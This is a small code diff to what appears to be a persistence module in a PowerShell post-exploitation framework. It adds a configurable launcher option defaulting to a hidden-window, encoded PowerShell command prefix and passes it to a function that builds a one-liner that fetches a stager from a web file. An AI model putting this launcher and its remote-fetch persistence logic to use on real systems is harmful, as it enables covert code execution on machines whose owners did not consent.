@@ -38,6 +38,11 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   ''
             },
+            'Launcher' : {
+                'Description'   :   'Launcher string.',
+                'Required'      :   True,
+                'Value'         :   'powershell -noP -sta -w 1 -enc '
+            },
             #'Listener' : {
             #    'Description'   :   'Listener to use.',
             #    'Required'      :   False,
@@ -104,6 +109,7 @@ class Module:
     def generate(self):
         
         #listenerName = self.options['Listener']['Value']
+        launcher_prefix = self.options['Launcher']['Value']
         
         # trigger options
         dailyTime = self.options['DailyTime']['Value']
@@ -149,7 +155,7 @@ class Module:
 
         else:
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = self.mainMenu.stagers.generate_launcher_fetcher(language='powershell', encode=True, webFile=webFile)
+            launcher = self.mainMenu.stagers.generate_launcher_fetcher(language='powershell', encode=True, webFile=webFile, launcher=launcher_prefix)
             
             encScript = launcher.split(" ")[-1]
             statusMsg += "using launcher_fetcher"
